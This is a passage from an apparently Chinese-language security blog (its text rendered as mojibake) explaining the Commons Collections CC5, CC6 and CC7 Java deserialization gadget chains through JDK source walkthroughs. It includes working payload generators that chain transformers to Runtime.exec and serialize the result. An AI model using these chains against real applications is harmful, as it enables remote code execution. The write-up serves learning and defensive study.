<span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc5.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc5.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections6ååºåˆ—åŒ–é“¾"><a href="#CommonsCollections6ååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsCollections6ååºåˆ—åŒ–é“¾"></a>CommonsCollections6ååºåˆ—åŒ–é“¾</h2><p>è¯¥é“¾çš„ååŠæ®µä¸CC5ç›¸åŒï¼Œä¸åŒåœ¨äºè§¦å‘<code>tiedMapEntry</code>çš„<code>getValue()</code>ä¸Šå±‚æ–¹æ³•æ˜¯<code>hashCode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>HashMap</code>ç±»çš„<code>hash()</code>æ–¹æ³•æœ‰è°ƒç”¨<code>hashcode()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªæ¡ä»¶æ˜¯<code>key</code>ä¸ä¸ºç©ºï¼Œè¿™ä¸ªæ¡ä»¶åé¢ä¼šç”¨åˆ°ã€‚è°ƒç”¨<code>hashcode()</code>å°±åœ¨<code>HashMap</code>ç±»çš„<code>readObject()</code>é‡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>HashSet</code>çš„<code>readObject()</code>ä¸­ï¼Œå¯ä»¥å¯¹ååºåˆ—åŒ–çš„<code>map</code>å­—æ®µè°ƒç”¨<code>readObject()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">capacity</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                             capacity);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">        <span class="type">float</span> <span class="variable">loadFactor</span> <span class="operator">=</span> s.readFloat();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                             size);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">        <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">        capacity = (<span class="type">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">                HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Create backing HashMap</span></span><br><span class="line">        map = (((HashSet&lt;?&gt;)<span class="built_in">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>HashSet</code>è‡ªå¸¦çš„<code>add()</code>æ–¹æ³•ä¼šæŒç»­è°ƒç”¨åé¢çš„<code>put()</code>ã€<code>hash()</code>æ–¹æ³•ï¼Œå¯¼è‡´é“¾åœ¨åºåˆ—åŒ–å‰æå‰è§¦å‘ï¼Œè¿™ä¼šæ±¡æŸ“æˆ‘ä»¬æ„é€ çš„<code>map</code>å¯¹è±¡ï¼Œåé¢ååºåˆ—åŒ–åœ¨<code>get()</code>æ—¶è¿›å…¥elseè¯­å¥ï¼Œå¯¼è‡´ååºåˆ—åŒ–æ—¶æ— æ³•æ­£å¸¸æ‰§è¡Œå‘½ä»¤ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨åˆ›å»º<code>tiedEntry</code>æ—¶ä¼ å…¥æ— å®³çš„<code>HashMap</code>ï¼Œåé¢å†é€šè¿‡åå°„ä¿®æ”¹<code>tiedEntry</code>çš„<code>map</code>å­—æ®µä¸º<code>lazyMap</code>ï¼Œç›¸å½“äºè®©<code>lazyMap</code>ç»•è¿‡<code>add()</code>åé¢çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.put(e, PRESENT)==<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¨é“¾å¦‚ä¸‹ï¼Œè¯¥é“¾ç›¸å¯¹è¾ƒçŸ­</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> tiedMapEntry.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">map</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        map.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;cc6.ser&quot;</span>)));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(<span class="string">&quot;cc6.ser&quot;</span>)));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="CommonsCollections7ååºåˆ—åŒ–é“¾"><a href="#CommonsCollections7ååºåˆ—åŒ–é“¾" class="headerlink" title="CommonsCollections7ååºåˆ—åŒ–é“¾"></a>CommonsCollections7ååºåˆ—åŒ–é“¾</h2><p>è¯¥é“¾åæ®µä¸CC1ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äº<code>lazyMap</code>çš„ä¸Šå±‚è°ƒç”¨ä¸åŒï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬é€‰æ‹©<code>AbstractMap</code>ç±»ä¸­çš„<code>equals()</code>æ–¹æ³•ï¼Œè¯¥ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥<code>equals()</code>æ–¹æ³•è¢«<code>Hashtable</code>ç±»çš„<code>reconstitutionPut()</code>æ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">        <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">        <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Creates the new entry.</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">        tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>reconstitutionPut()</code>æ–¹æ³•è¢«<code>Hashtable</code>ç±»çš„<code>readObject()</code>è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the original length of the array and number of elements</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Compute new size with a bit of room 5% to grow but</span></span><br><span class="line">        <span class="comment">// no larger than the original size.  Make the length</span></span><br><span class="line">        <span class="comment">// odd if it&#x27;s large enough, this helps distribute the entries.</span></span><br><span class="line">        <span class="comment">// Guard against the length ending up zero, that&#x27;s not valid.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)(elements * loadFactor) + (elements / <span class="number">20</span>) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        <span class="keyword">if</span> (origlength &gt; <span class="number">0</span> &amp;&amp; length &gt; origlength)</span><br><span class="line">            length = origlength;</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ–¹æ³•é“¾å°±å¾ˆæ˜æ˜¾äº†<code>readObject()</code>-&gt;<code>reconstitutionPut()</code>-&gt;<code>equals()</code>-&gt;<code>get()</code>ï¼Œ<code>readObject()</code>æ²¡æœ‰ä»€ä¹ˆéœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œä¸»è¦çœ‹<code>reconstitutionPut()</code>ï¼Œè¦è®©<code>key</code>ä¸ºæ„é€ çš„æ¶æ„<code>lazyMap</code></p><p>è¯¥æ–¹æ³•å°†<code>readObject()</code>éå†å‡ºçš„æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„<code>key</code>ä¸å·²éå†å‡ºçš„<code>key</code>è¿›è¡Œæ¯”å¯¹ï¼Œå½“<code>key</code>ä¸é‡å¤æ—¶åˆ™ä¼šå°†å…¶åŠ å…¥<code>table</code>è¿™ä¸ªé”®å€¼å¯¹æ•°ç»„ä¸­ã€‚å› ä¸ºè¦ä¸å…ˆå‰çš„<code>key</code>æ¯”å¯¹æ‰ä¼šè°ƒç”¨<code>equals()</code>ï¼Œè‹¥<code>hashTable</code>ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ å°±ä¸ä¼šè§¦å‘<code>equals()</code>ï¼Œè¿™å†³å®šäº†æˆ‘ä»¬åé¢è¦å¾€é‡Œé¢ä¼ å…¥ä¸¤ä¸ª<code>lazyMap</code></p><p>åŒæ—¶ç”±äºifè¯­å¥é‡Œé¢æ˜¯é€»è¾‘ä¸è¿ç®—ï¼Œè¿™è¿˜è¦æ±‚<code>e.hash == hash</code>å¿…é¡»ä¸ºçœŸæ‰ä¼šè¿›è¡Œåé¢çš„<code>equals()</code>è¿ç®—ï¼Œä¹Ÿå°±æ˜¯å½“å‰éå†é”®å€¼å¯¹çš„å“ˆå¸Œä¸å·²æœ‰é”®å€¼å¯¹çš„å“ˆå¸Œç›¸ç­‰ï¼Œè¿™é‡Œåˆ†åˆ«å–<code>yy</code>å’Œ<code>zZ</code></p><p>ç”±ä¸Šå¯ä»¥æ„é€ å‡ºä»¥ä¸‹é“¾</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;?,?&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        HashMap&lt;?,?&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span 